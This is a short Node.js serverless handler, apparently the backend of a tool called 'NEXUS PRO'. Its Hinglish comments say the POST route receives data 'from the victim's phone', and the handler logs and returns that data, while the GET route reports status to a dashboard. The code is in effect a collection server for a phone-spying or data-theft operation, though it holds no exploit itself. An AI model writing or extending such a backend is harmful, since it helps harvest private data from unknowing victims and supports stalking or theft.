module.exports = (req, res) => {
  if (req.method === 'POST') {
    // Ye code victim ke phone se data receive karega
    const victimData = req.body;
    console.log("New Data Received:", victimData);
    return res.status(200).json({ status: 'success', data: victimData });
  } else {
    // Ye dashboard ko stats dikhayega
    return res.status(200).json({ 
        message: "NEXUS PRO Backend is Live",
        connected: true
    });
  }
};
